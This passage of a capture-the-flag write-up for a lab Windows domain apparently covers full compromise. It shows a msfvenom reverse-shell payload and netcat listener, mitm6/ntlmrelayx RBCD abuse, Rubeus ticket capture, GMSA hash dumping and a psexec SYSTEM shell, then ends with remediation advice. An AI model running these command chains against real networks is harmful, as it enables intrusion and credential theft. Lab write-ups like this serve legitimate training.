kali@kali$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.99.12 LPORT=9001 -f exe -o amra.exe
```

### 7.2 Uploading to WS-3

Via Evil-WinRM on `WS-3`, `amra.exe` is uploaded to `C:\Programdata` and granted permissive ACLs:

```powershell
*Evil-WinRM* PS C:\Programdata> upload amra.exe
*Evil-WinRM* PS C:\Programdata> icacls.exe amra.exe /grant Everyone:F
```

### 7.3 Triggering the Exploit

A `netcat` listener is started on `LAB-2` on port 9001. When the automated review process evaluates Nya's lecture on `WS-3`, opening `click_me.url` executes `amra.exe`:

```bash
kali@kali$ nc -lvnp 9001
Listening on 0.0.0.0 9001
Connection from 192.168.99.2 65144 received!
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\windows\temp>whoami
university\martin.t
```

The connection lands on `LAB-2` as user `university\martin.t`.

### 7.4 User Flag Captured

Retrieve the user flag from `C:\Users\martin.t\Desktop\user.txt`:

```powershell
PS C:\Windows\system32> type C:\Users\martin.t\Desktop\user.txt
17d50ee87af5b0e474a7290b754a83d0
```

The user flag `17d50ee87af5b0e474a7290b754a83d0` is successfully read.

---

## 8. Administrator on WS-3 (RBCD Attack)

### 8.1 Strategy

Because `WS-3` has unconstrained delegation enabled, gaining local administrator rights on `WS-3` allows extracting cached TGTs from LSASS memory. Local admin on `WS-3` is achieved by abusing IPv6/WPAD DNS poisoning (`mitm6`) and relaying authenticated machine requests to LDAP (`ntlmrelayx`) to configure Resource-Based Constrained Delegation (RBCD).

### 8.2 Setting Up mitm6

On `LAB-2`, `mitm6` is executed to listen for IPv6 DNS queries and spoof WPAD responses for `university.htb`:

```bash
root@LAB-2:/tmp# python3 mitm6.py -d university.htb -i eth0
Starting mitm6 using the following configuration:
Primary adapter: eth0 [00:15:5d:05:80:07]
IPv4 address: 192.168.99.12
IPv6 address: fe80::215:5dff:fe05:8007
DNS local search domain: university.htb
DNS allowlist: university.htb
```

### 8.3 Creating a Fake Computer Account

Using `WAO`'s domain credentials, `addcomputer.py` creates a fake computer object (`hyena$`) in Active Directory:

```bash
kali@kali$ addcomputer.py -computer-name hyena -computer-pass hyena123 -dc-host dc.university.htb university/WAO:WebAO1337
[*] Successfully added machine account hyena$ with password hyena123.
```

### 8.4 Starting ntlmrelayx

On `LAB-2`, `ntlmrelayx.py` is configured to catch relayed machine authentication, target LDAP on `DC` (`192.168.99.1`), and write `msDS-AllowedToActOnBehalfOfOtherIdentity` rights for `hyena$` onto `WS-3$`:

```bash
root@LAB-2:~# ntlmrelayx.py -6 -t ldap://192.168.99.1 --delegate-access --escalate-user hyena$ -wh hyena -ts --no-da
[*] Servers started, waiting for connections
```

### 8.5 Triggering Authentication

From the `martin.t` shell on `WS-3`, the Windows Update service is restarted to force WPAD network requests:

```powershell
sc.exe start wuauserv
Start-Process -FilePath 'ms-settings:windowsupdate'
```

### 8.6 Relay Success

`WS-3$` sends NTLM authentication over IPv6 to `mitm6`, which `ntlmrelayx` relays to LDAP on `DC`:

```
[*] Delegation rights modified succesfully!
[*] hyena$ can now impersonate users on WS-3$ via S4U2Proxy
```

The output confirms `ntlmrelayx` successfully wrote the RBCD attribute to `WS-3$`.

### 8.7 Getting Administrator Ticket

With RBCD configured, `impacket-getST` uses `hyena$`'s credentials to perform S4U2Self and S4U2Proxy impersonation, requesting a service ticket for `Administrator` targeting `WS-3`:

```bash
kali@kali$ impacket-getST -spn HTTP/WS-3.university.htb university.htb/hyena\$:'hyena123' -impersonate 'Administrator' -dc-ip 10.129.231.193
[*] Saving ticket in Administrator@HTTP_WS-3.university.htb@UNIVERSITY.HTB.ccache
```

### 8.8 Connecting as Administrator on WS-3

With the forged service ticket obtained via RBCD S4U2Proxy, authentication to `WS-3` as `Administrator` is established using Evil-WinRM:

```bash
kali@kali$ netexec smb dc.university.htb --generate-krb5-file krb5.conf
kali@kali$ sudo cp krb5.conf /etc/krb5.conf
kali@kali$ export KRB5CCNAME=Administrator@HTTP_WS-3.university.htb@UNIVERSITY.HTB.ccache
kali@kali$ evil-winrm -r university.htb -i WS-3.university.htb
*Evil-WinRM* PS C:\Users\Administrator.UNIVERSITY\Documents> whoami
university\administrator
```

Administrative access as `Administrator` on `WS-3` is confirmed.

---

## 9. Dumping Tickets with Rubeus (Unconstrained Delegation Abuse)

### 9.1 Uploading Rubeus

From the administrative Evil-WinRM session on `WS-3`, `Rubeus.exe` is uploaded to `C:\programdata`:

```powershell
*Evil-WinRM* PS C:\programdata> upload Rubeus.exe
```

### 9.2 Monitoring TGTs

Because `WS-3` is trusted for unconstrained delegation, any domain user authenticating to `WS-3` stores a copy of their TGT in LSASS. `Rubeus.exe monitor` is executed to monitor and extract incoming TGTs:

```powershell
*Evil-WinRM* PS C:\programdata> .\Rubeus.exe monitor /nowrap
[*] Action: TGT Monitoring
[*] Monitoring every 60 seconds for new TGTs

[*] 7/28/2026 5:59:00 PM UTC - Found new TGT:
  User                  :  Rose.L@UNIVERSITY.HTB
  StartTime             :  7/28/2026 10:56:51 AM
  EndTime               :  7/28/2026 8:55:20 PM
  RenewTill             :  8/4/2026 10:55:20 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   : doIFejCCBXagAwIBBaEDAgEWooIEezCCBHdhggRzMIIEb6ADAgEFoRAbDlVOSVZFUlNJVFkuSFRCoiMwIaADAgECoRowGBsGa3JidGd0Gw5VTklWRVJTSVRZLkhUQqOCBC8wggQroAMCARKhAwIBAqKCBB0EggQZblxNCJZk/hnK+sdgc3fbfd2UvLd2U0SwvkqYz+HBfkOc9CcFkXe72lsfAvbK/HppxMKUPffs/CWRYho0Y3pSRdGuyDsx60WuoBQUGQCvNZon+bTvCDO6fmgaszIEy7rsAgB5ddfLCQoWSLRzNWsBPVdwSP+RcxEs10Dzsfre2wkuKXg9k1PGH6BX2mLoNy0C/tPnAL7iYY4CLtm3atmUwDMej440S64AQKmRQVV6CBMh368xVTrxezsSj7ULNUf0u2+oEk9HFa5yZhM7ttzJ7QIJaP1wNq2xCgJc1g/FEMp0E5Fe33AOUWJ18rYz1lw0p9BWaPHn2kKqviiyRmRAmfkwioQCVA/gV99KzI0Kqm9QbdknyxySevW8BiK09ElFLKWlr1iHa0lShRFzt5F1zdg+611eyBv4P6MWNP00EYD7FiX0zExN0wboVsELcCY9P5swWGEIVFOjTZ+cpCZd0+s6q1AIL6lExsNeo4HxEe2WBZI9O1EbVHsecNojxE0/EdxM6xmcOhogZaTpckVYCIavt4P2OBxhif1oTpcqAdJd/XpTfsXwNvU93K85hA0YSJDdyzs2iw3qmx+J4OCCXPEqRwHZKI0Z9GZG+qQsTiztlDegJF/Dvyc0APotmzu2KLWFKxuCuwIVBkUJ9dUQyKhprZPtaVnhReLwmc75VWIr4Avdhw59eMA0E8SXGrEN3yIYnUlKtT09mEPDPdn3MWFqN7bbi4MgkI5Fj4xmprAxZoGCMko/IfIX4GKi63/XPCIZ8v9liCH2b9oNmetB/I3Xkyjf6m4sU4fswx89HEPctoEeLkHJVU8wGemwyh24bnpD/tBrys6yJnIPzn8Wv+jUCS82L476SIAtJUHDtrxScYCEoc9GB6hqxgYL74oMbDra9pNGLDVPHgzWrii4vbTRDNIuWR4QofiLfyUdXvumdcgXHjl/QRcgsUyQhM6VzAN7IwRJZGavhi6hoMkYskhf7IoV8aDOZ2JflTDqiI/RqeByz62qw3HVo1K8Skf+oWw92VqGf8HOy8Enx2genAEl4PKF1mdyYvJ1ugCju4OpeneZkibCGB8ZXUsZLXkRN8y4qmPqkLOyn24xmC2V7LZp7v1GmK7CcWWAwbS4cmseK+WksK+bL7uisoKXtM8iSfC3fzqm1zTjx1TMcfzmZPq4/pfrglZyqVRbbRZHyd5Uhcq5x1Zk5TPasLGGlZINEBZXyuY2/QQjjZSJcU1adQuPEw4NMaTcxZrKlbWZYv0l/v+qbEPpDRk3E9q8LNiY50actG67Cp+qWn+qBzwR86nEY1wdu1DFc4AaluS9rh/fl21IhlcMzhezeRGvQnh05IBUKNl2YV2sIQbav+snk8BCZUSDgvBch2bI30+U+jHM8OBhrdHYD2ejgeowgeegAwIBAKKB3wSB3H2B2TCB1qCB0zCB0DCBzaArMCmgAwIBEqEiBCBzZjpshlikv5eOq8MQ1qqxE5WHBABNH4l4AngVL7bJcaEQGw5VTklWRVJTSVRZLkhUQqITMBGgAwIBAaEKMAgbBlJvc2UuTKMHAwUAYKEAAKURGA8yMDI2MDcyODE3NTY1MVqmERgPMjAyNjA3MjkwMzU1MjBapxEYDzIwMjYwODA0MTc1NTIwWqgQGw5VTklWRVJTSVRZLkhUQqkjMCGgAwIBAqEaMBgbBmtyYnRndBsOVU5JVkVSU0lUWS5IVEI=

[*] 7/28/2026 5:59:00 PM UTC - Found new TGT:
  User                  :  Martin.T@UNIVERSITY.HTB
  StartTime             :  7/28/2026 10:20:25 AM
  EndTime               :  7/28/2026 8:20:25 PM
  RenewTill             :  8/4/2026 10:20:25 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  [ticket cached — not needed for this path, since Martin.T has no useful outbound object control per BloodHound]

[*] 7/28/2026 5:59:00 PM UTC - Found new TGT:
  User                  :  WS-3$@UNIVERSITY.HTB
  StartTime             :  7/28/2026 10:10:03 AM
  EndTime               :  7/28/2026 8:20:08 PM
  RenewTill             :  8/4/2026 10:20:08 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  [the machine's own TGT — expected, not useful on its own]

[*] Ticket cache size: 3
```

`Rubeus` captures a Base64-encoded TGT belonging to domain user `Rose.L@UNIVERSITY.HTB`.

---

## 10. Rose.L Attack (GMSA Abuse)

### 10.1 Converting Rose.L's Ticket and Getting a Shell

On Kali, the Base64 Kirbi ticket captured by Rubeus is converted into standard ccache format using `ticketConverter.py`:

```bash
kali@kali$ echo "doIFejCCBXagAwIBBaEDAgEWooIEezCCBHdhggRzMIIEb6ADAgEFoRAbDlVOSVZFUlNJVFkuSFRCoiMwIaADAgECoRowGBsGa3JidGd0Gw5VTklWRVJTSVRZLkhUQqOCBC8wggQroAMCARKhAwIBAqKCBB0EggQZblxNCJZk/hnK+sdgc3fbfd2UvLd2U0SwvkqYz+HBfkOc9CcFkXe72lsfAvbK/HppxMKUPffs/CWRYho0Y3pSRdGuyDsx60WuoBQUGQCvNZon+bTvCDO6fmgaszIEy7rsAgB5ddfLCQoWSLRzNWsBPVdwSP+RcxEs10Dzsfre2wkuKXg9k1PGH6BX2mLoNy0C/tPnAL7iYY4CLtm3atmUwDMej440S64AQKmRQVV6CBMh368xVTrxezsSj7ULNUf0u2+oEk9HFa5yZhM7ttzJ7QIJaP1wNq2xCgJc1g/FEMp0E5Fe33AOUWJ18rYz1lw0p9BWaPHn2kKqviiyRmRAmfkwioQCVA/gV99KzI0Kqm9QbdknyxySevW8BiK09ElFLKWlr1iHa0lShRFzt5F1zdg+611eyBv4P6MWNP00EYD7FiX0zExN0wboVsELcCY9P5swWGEIVFOjTZ+cpCZd0+s6q1AIL6lExsNeo4HxEe2WBZI9O1EbVHsecNojxE0/EdxM6xmcOhogZaTpckVYCIavt4P2OBxhif1oTpcqAdJd/XpTfsXwNvU93K85hA0YSJDdyzs2iw3qmx+J4OCCXPEqRwHZKI0Z9GZG+qQsTiztlDegJF/Dvyc0APotmzu2KLWFKxuCuwIVBkUJ9dUQyKhprZPtaVnhReLwmc75VWIr4Avdhw59eMA0E8SXGrEN3yIYnUlKtT09mEPDPdn3MWFqN7bbi4MgkI5Fj4xmprAxZoGCMko/IfIX4GKi63/XPCIZ8v9liCH2b9oNmetB/I3Xkyjf6m4sU4fswx89HEPctoEeLkHJVU8wGemwyh24bnpD/tBrys6yJnIPzn8Wv+jUCS82L476SIAtJUHDtrxScYCEoc9GB6hqxgYL74oMbDra9pNGLDVPHgzWrii4vbTRDNIuWR4QofiLfyUdXvumdcgXHjl/QRcgsUyQhM6VzAN7IwRJZGavhi6hoMkYskhf7IoV8aDOZ2JflTDqiI/RqeByz62qw3HVo1K8Skf+oWw92VqGf8HOy8Enx2genAEl4PKF1mdyYvJ1ugCju4OpeneZkibCGB8ZXUsZLXkRN8y4qmPqkLOyn24xmC2V7LZp7v1GmK7CcWWAwbS4cmseK+WksK+bL7uisoKXtM8iSfC3fzqm1zTjx1TMcfzmZPq4/pfrglZyqVRbbRZHyd5Uhcq5x1Zk5TPasLGGlZINEBZXyuY2/QQjjZSJcU1adQuPEw4NMaTcxZrKlbWZYv0l/v+qbEPpDRk3E9q8LNiY50actG67Cp+qWn+qBzwR86nEY1wdu1DFc4AaluS9rh/fl21IhlcMzhezeRGvQnh05IBUKNl2YV2sIQbav+snk8BCZUSDgvBch2bI30+U+jHM8OBhrdHYD2ejgeowgeegAwIBAKKB3wSB3H2B2TCB1qCB0zCB0DCBzaArMCmgAwIBEqEiBCBzZjpshlikv5eOq8MQ1qqxE5WHBABNH4l4AngVL7bJcaEQGw5VTklWRVJTSVRZLkhUQqITMBGgAwIBAaEKMAgbBlJvc2UuTKMHAwUAYKEAAKURGA8yMDI2MDcyODE3NTY1MVqmERgPMjAyNjA3MjkwMzU1MjBapxEYDzIwMjYwODA0MTc1NTIwWqgQGw5VTklWRVJTSVRZLkhUQqkjMCGgAwIBAqEaMBgbBmtyYnRndBsOVU5JVkVSU0lUWS5IVEI=" | base64 -d > rose.l.kirbi
kali@kali$ ticketConverter.py rose.l.kirbi rose.l.ccache
[*] converting kirbi to ccache...
[+] done
```

Set `KRB5CCNAME` and connect directly to `DC.university.htb` as `Rose.L` via Evil-WinRM:

```bash
kali@kali$ KRB5CCNAME=rose.l.ccache evil-winrm -r university.htb -i DC.university.htb
Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Rose.L\Documents> whoami
university\rose.l
```

Interactive shell access as `university
ose.l` on `DC` is achieved.

### 10.2 Retrieving the GMSA Password

Active Directory ACL enumeration via BloodHound indicates that `Rose.L` is a member of `Help Desk`, which is nested inside `Account Operators`. The `Account Operators` group holds `ReadGMSAPassword` rights over the Group Managed Service Account `GMSA-PClient01$`.

Using `Rose.L`'s ticket, `netexec --gmsa` reads the managed password structure for `GMSA-PClient01$`:

```bash
kali@kali$ KRB5CCNAME=rose.l.ccache netexec ldap dc.university.htb --use-kcache --gmsa
LDAP        dc.university.htb 389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:UNIVERSITY.HTB) (signing:None) (channel binding:No TLS cert)
LDAP        dc.university.htb 389    DC               [+] UNIVERSITY.HTB\Rose.L from ccache
LDAP        dc.university.htb 389    DC               [*] Getting GMSA Passwords
LDAP        dc.university.htb 389    DC               Account: GMSA-PClient01$      NTLM: de6942ca053425efd2e0b2cf1d6f7e74
LDAP        dc.university.htb 389    DC               Account: GMSA-PClient01$      aes128-cts-hmac-sha1-96: a68e801336924d77a1b5568eb41f12ea
LDAP        dc.university.htb 389    DC               Account: GMSA-PClient01$      aes256-cts-hmac-sha1-96: 55cdf09bb775e527a506065fb13012b79609b7d4a66e7d5601581e6838dc812d
```

Verify SMB authentication using `GMSA-PClient01$`'s NTLM hash (`de6942ca053425efd2e0b2cf1d6f7e74`):

```bash
kali@kali$ netexec smb dc.university.htb -u GMSA-PClient01$ -H de6942ca053425efd2e0b2cf1d6f7e74
SMB         10.129.231.193   445    DC               [+] university.htb\GMSA-PClient01$:de6942ca053425efd2e0b2cf1d6f7e74
kali@kali$ netexec winrm dc.university.htb -u GMSA-PClient01$ -H de6942ca053425efd2e0b2cf1d6f7e74
WINRM       10.129.231.193   5985   DC               [-] university.htb\GMSA-PClient01$:de6942ca053425efd2e0b2cf1d6f7e74
```

### 10.3 Abusing GMSA-PClient01$'s RBCD Rights Over the DC

BloodHound enumeration discloses that `GMSA-PClient01$` holds `msDS-AllowedToActOnBehalfOfOtherIdentity` (RBCD) permissions over the Domain Controller computer object `DC.university.htb`.

Using `GMSA-PClient01$`'s NTLM hash, `impacket-getST` performs S4U2Proxy impersonation to request an `Administrator` service ticket targeting `http/dc.university.htb`:

```bash
kali@kali$ impacket-getST -spn http/dc.university.htb -hashes :de6942ca053425efd2e0b2cf1d6f7e74 'UNIVERSITY.HTB/GMSA-PClient01$' -impersonate Administrator -dc-ip 10.129.231.193 -no-pass
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@http_dc.university.htb@UNIVERSITY.HTB.ccache
```

### 10.4 Connecting as Administrator on the DC

Export the generated service ticket `Administrator@http_dc.university.htb@UNIVERSITY.HTB.ccache` and execute `impacket-psexec` to obtain a SYSTEM shell on `DC.university.htb`:

```bash
kali@kali$ export KRB5CCNAME=Administrator@http_dc.university.htb@UNIVERSITY.HTB.ccache
kali@kali$ impacket-psexec -k -no-pass dc.university.htb
[*] Requesting shares on dc.university.htb.....
[*] Found writable share ADMIN$
[*] Uploading file eQMZKGpg.exe
[*] Opening SVCManager on dc.university.htb.....
[*] Creating service sDOI on dc.university.htb.....
[*] Starting service sDOI.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.6414]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

### 10.5 Root Flag & SYSTEM Access

With SYSTEM privileges established on `DC.university.htb`, navigate to the Administrator desktop and retrieve `root.txt`:

```powershell
C:\Windows\system32> cd C:\Users\Administrator\Desktop
C:\Users\Administrator\Desktop> dir
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        7/28/2026   4:46 AM             34 root.txt

C:\Users\Administrator\Desktop> type root.txt
5048c9c4357420a96a8aec19e8598521
```

The root flag `5048c9c4357420a96a8aec19e8598521` is successfully captured, completing the full compromise of `University.htb`.

---

## 11. Remediation & Security Recommendations

1. **xhtml2pdf / ReportLab RCE (CVE-2023-33733) [Critical]:** Upgrade ReportLab to version 3.6.13 or later and update `xhtml2pdf` to a patched release. Ensure server-side PDF generation components strictly sanitize HTML inputs and disable dynamic evaluation of CSS/HTML attributes.

2. **Hardcoded Credentials & Script Passwords [High]:** Remove cleartext credentials from `db-backup-automator.ps1`. Use Windows Credential Manager, CyberArk, or Azure Key Vault for service automation accounts, and enforce distinct passwords across service scripts and user accounts.

3. **Unprotected Root CA Private Keys [Critical]:** Move `rootCA.key` out of the web server directory. Store CA private keys in a Hardware Security Module (HSM) or an offline vault with strict NTFS Access Control Lists restricting access exclusively to SYSTEM and CA administrators.

4. **Unvalidated Certificate Authentication [High]:** Update the Django web application to validate client certificate serial numbers and revocation status against an active Certificate Revocation List (CRL) or OCSP responder rather than accepting any certificate signed by the Root CA.

5. **Windows SmartScreen Bypass via `.url` Files (CVE-2023-36025) [High]:** Apply Microsoft security updates addressing CVE-2023-36025 across all domain endpoints. Configure email and web upload gateways to block or inspect `.url` internet shortcut files.

6. **Unconstrained Delegation on Workstations [Critical]:** Disable Unconstrained Delegation (`TrustedForDelegation: False`) on `WS-3` and all domain workstations. Replace unconstrained delegation with Resource-Based Constrained Delegation (RBCD) scoped to specific required Service Principal Names (SPNs).

7. **IPv6 / WPAD Spoofing & Missing LDAP Signing [High]:** Disable IPv6 and WPAD via Group Policy if not actively utilized in the environment. Enforce LDAP Signing and LDAP Channel Binding Requirement (`LdapServerIntegrity = 2`) on all Domain Controllers to neutralize NTLM relay attacks against LDAP.

8. **Overly Permissive GMSA Retrieval Rights [High]:** Restrict `PrincipalsAllowedToRetrieveManagedPassword` on `GMSA-PClient01$` to include only the specific computer objects running the service. Remove `Account Operators` and `Help Desk` from GMSA read permissions.

9. **GMSA Delegation Rights Over Tier-0 Assets [Critical]:** Audit and remove `msDS-AllowedToActOnBehalfOfOtherIdentity` configurations that grant service accounts delegation rights over Domain Controllers or Tier-0 assets. Implement strict administrative boundary separation between service accounts and domain infrastructure objects.

10. **Nested Privileges in Account Operators [High]:** Restrict membership in the `Account Operators` built-in group. Re-architect administrative workflows using fine-grained delegation of control on target Organizational Units (OUs) rather than relying on high-privilege built-in Active Directory groups.

